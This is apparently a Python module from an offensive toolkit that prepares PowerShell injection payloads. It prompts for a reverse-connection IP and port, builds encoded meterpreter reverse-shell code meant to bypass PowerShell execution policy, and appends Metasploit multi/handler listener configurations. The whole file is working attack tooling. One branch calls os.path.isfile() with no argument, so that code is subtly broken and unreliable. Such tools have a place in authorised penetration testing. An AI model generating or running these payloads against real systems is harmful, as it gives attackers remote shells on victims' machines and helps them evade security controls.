#!/usr/bin/env python
# coding=utf-8
import os
import re
import time

import src.core.setcore as core

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

def prep_powershell_payload():

    # grab stage encoding flag
    stage_encoding = core.check_config("STAGE_ENCODING=").lower()
    if stage_encoding == "off":
        stage_encoding = "false"
    else:
        stage_encoding = "true"

    # check to see if we are just generating powershell code
    powershell_solo = core.check_options("POWERSHELL_SOLO")

    # check if port is there
    port = core.check_options("PORT=")

    # check if we are using auto_migrate
    auto_migrate = core.check_config("AUTO_MIGRATE=")

    # check if we are using pyinjection
    pyinjection = core.check_options("PYINJECTION=")
    if pyinjection == "ON":
        # check to ensure that the payload options were specified right
        if os.path.isfile(os.path.join(core.setdir, "payload_options.shellcode")):
            pyinjection = "on"
            core.print_status("Multi/Pyinjection was specified. Overriding config options.")
        else:
            pyinjection = "off"

    # grab ipaddress
    if core.check_options("IPADDR=") != 0:
        ipaddr = core.check_options("IPADDR=")
    else:
        ipaddr = input("Enter the ipaddress for the reverse connection: ")
        core.update_options("IPADDR=" + ipaddr)

    # check to see if we are using multi powershell injection
    multi_injection = core.check_config("POWERSHELL_MULTI_INJECTION=").lower()

    # turn off multi injection if pyinjection is specified
    if pyinjection == "on":
        multi_injection = "off"

    # check what payloads we are using
    powershell_inject_x86 = core.check_config("POWERSHELL_INJECT_PAYLOAD_X86=")

    # if we specified a hostname then default to reverse https/http
    if not core.validate_ip(ipaddr):
        powershell_inject_x86 = "windows/meterpreter/reverse_http"

    # prompt what port to listen on for powershell then make an append to the current
    # metasploit answer file
    if os.path.isfile(os.path.join(core.setdir, "meta_config_multipyinjector")):
        # if we have multi injection on, don't worry about these
        if multi_injection != "on" and pyinjection == "off":
            core.print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
            port = input(core.setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
            if not port:
                port = "443"
            with open(os.path.join(core.setdir, "meta_config_multipyinjector")) as fileopen:
                data = fileopen.read()
            match = re.search(port, data)
            if not match:
                with open(os.path.join(core.setdir, "meta_config_multipyinjector"), "a") as filewrite:
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD {0}\n"
                                    "set LHOST {1}\n"
                                    "set LPORT {2}\n"
                                    "set EnableStageEncoding {3}\n"
                                    "set ExitOnSession false\n"
                                    "exploit -j\n".format(powershell_inject_x86, ipaddr, port, stage_encoding))

    # if we have multi injection on, don't worry about these
    if multi_injection != "on" and pyinjection == "off":
        # check to see if the meta config multi pyinjector is there
        if not os.path.isfile(os.path.join(core.setdir, "meta_config_multipyinjector")):
            if core.check_options("PORT=") != 0:
                port = core.check_options("PORT=")
            # if port.options isnt there then prompt
            else:
                port = input(core.setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
                if not port:
                    port = "443"
                core.update_options("PORT={0}".format(port))

    # turn off multi_injection if we are riding solo from the powershell menu
    if powershell_solo == "ON":
        multi_injection = "off"
        pyinjection = "on"

    # if we are using multi powershell injection
    if multi_injection == "on" and pyinjection == "off":
        core.print_status("Multi-Powershell-Injection is set to ON, this should be sweet...")

    # define a base variable
    x86 = ""

    # specify a list we will use for later
    multi_injection_x86 = ""

    # here we do some funky loops so we don't need to rewrite the code below
    if multi_injection == "on":
        port = core.check_config("POWERSHELL_MULTI_PORTS=")
        port = port.split(",")

    if multi_injection == "on":
        # iterate through the ports, used for POWERSHELL_MULTI_PORTS
        for ports in port:
            # dont cycle through if theres a blank
            if ports:
                core.print_status("Generating x86-based powershell injection code for port: {0}".format(ports))
                multi_injection_x86 = multi_injection_x86 + "," + core.generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, ports, x86)

                if os.path.isfile(os.path.join(core.setdir, "meta_config_multipyinjector")):
                    port_check = core.check_ports(os.path.join(core.setdir, "meta_config_multipyinjector"), ports)
                    if not port_check:
                        with open(os.path.join(core.setdir, "meta_config_multipyinjector"), "a") as filewrite:
                            filewrite.write("\nuse exploit/multi/handler\n")
                            if auto_migrate == "ON":
                                filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
                            filewrite.write("set PAYLOAD {0}\n"
                                            "set LHOST {1}\n"
                                            "set EnableStageEncoding {2}\n"
                                            "set LPORT {3}\n"
                                            "set ExitOnSession false\n"
                                            "exploit -j\n\n".format(powershell_inject_x86, ipaddr, stage_encoding, ports))

                # if we aren't using multi pyinjector
                if not os.path.isfile(os.path.join(core.setdir, "meta_config_multipyinjector")):
                    # if meta config isn't created yet then create it
                    if not os.path.isfile():
                        with open(os.path.join(core.setdir, "meta_config"), "w") as filewrite:
                            filewrite.write("")
                    port_check = core.check_ports(os.path.join(core.setdir, "meta_config"), ports)
                    if not port_check:
                        with open(os.path.join(core.setdir, "meta_config"), "a") as filewrite:
                            filewrite.write("\nuse exploit/multi/handler\n")
                            if auto_migrate == "ON":
                                filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
                            filewrite.write("set PAYLOAD {0}\n"
                                            "set LHOST {1}\n"
                                            "set EnableStageEncoding {2}\n"
                                            "set ExitOnSession false\n"
                                            "set LPORT {3}\n"
                                            "exploit -j\n\n".format(powershell_inject_x86, ipaddr, stage_encoding, ports))

    # here we do everything if pyinjection or multi pyinjection was specified
    if pyinjection == "on":
        injections = []
        # read in the file we need for parsing
        with open(os.path.join(core.setdir, "payload_options.shellcode")) as fileopen:
            payloads = fileopen.read()[:-1].rstrip()  # strips an extra ,
        payloads = payloads.split(",")
        # format: payload<space>port
        for payload in payloads:
            # format: payload<space>port
            payload = payload.split(" ")
            powershell_inject_x86 = payload[0]
            port = payload[1]
            core.print_status("Generating x86-based powershell injection code...")
            injections.append(core.generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86))
        multi_injection_x86 = ",".join(injections)

    # if its turned to off
    if multi_injection == "off" and pyinjection == "off":
        core.print_status("Generating x86-based powershell injection code...")
        x86 = core.generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)

    # if we are specifying multi powershell injection
    if multi_injection == "on" or pyinjection == "on":
        x86 = multi_injection_x86[1:]  # remove comma at beginning

    # check to see if we want to display the powershell command to the user
    verbose = core.check_config("POWERSHELL_VERBOSE=")
    if verbose.lower() == "on":
        core.print_status("Printing the x86 based encoded code...")
        time.sleep(3)
        print(x86)

    #with open(os.path.join(core.setdir, "x86.powershell"), "w") as filewrite:
    filewrite = open(core.setdir + "/x86.powershell", "w")
    filewrite.write(x86)
    filewrite.close()
    core.print_status("Finished generating powershell injection bypass.")
    core.print_status("Encoded to bypass execution restriction policy...")
